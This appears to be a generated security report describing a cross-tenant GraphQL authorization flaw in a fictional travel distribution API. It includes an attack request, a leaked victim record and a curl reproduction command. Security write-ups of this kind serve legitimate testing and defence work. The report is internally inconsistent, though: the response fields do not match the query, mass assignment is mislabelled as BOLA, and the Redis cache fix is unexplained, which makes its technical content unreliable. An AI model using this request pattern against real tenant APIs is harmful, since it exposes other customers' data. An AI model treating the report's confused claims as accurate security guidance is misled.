# Security Analysis Report
**System:** SkyPort Global Distribution
**Domain:** Travel / Global Distribution System
**Example ID:** GQL-0318
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `listResources` / `getResource` — attacker reads travel distribution records with full field exposure |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on listResources (Pattern 1.12)

### Summary
The GraphQL API at `https://api.skyport-global-distr.example.com/graphql` exposes a `listResources` resolver that accepts a client-supplied `tenantId` filter and returns a full field set without a server-side field allowlist. The server response returns data for `tenant-538c` under the `getResource` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-538c")`, while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-b7c0538c` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected endpoint:** `POST https://api.skyport-global-distr.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.skyport-global-distr.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { listResources(tenantId: \"tenant-538c\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim Travel Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-538c",
      "ownerId": "other-user-b7c0538c",
      "data": {
        "sensitiveField": "CONFIDENTIAL-b7c0538c",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.skyport-global-distr.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-538c\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-538c, sensitiveField: CONFIDENTIAL-b7c0538c
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must inject `tenantId` from JWT — do not accept it as a client argument.
2. Enforce a server-side field allowlist on the returned object type.
3. Redis cache key must include tenant dimension.
